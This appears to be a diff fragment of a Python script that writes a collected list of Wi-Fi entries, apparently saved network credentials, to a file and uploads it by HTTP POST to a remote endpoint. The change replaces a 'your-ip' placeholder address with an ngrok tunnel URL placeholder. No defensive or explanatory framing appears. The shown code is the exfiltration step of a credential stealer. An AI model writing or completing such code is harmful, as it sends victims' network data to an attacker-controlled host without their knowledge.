@@ -49,7 +49,7 @@ def run():
      for x in range(len(wifi_list)):
         f.write(wifi_list[x])
 
-  url = "http://your-ip:9000/"  # Adjust the IP and port accordingly
+  url = "https://ngrok-url-here"
   files = {'file': open(f'{curr_path}.txt', 'rb')}
 
   requests.post(url, files=files)
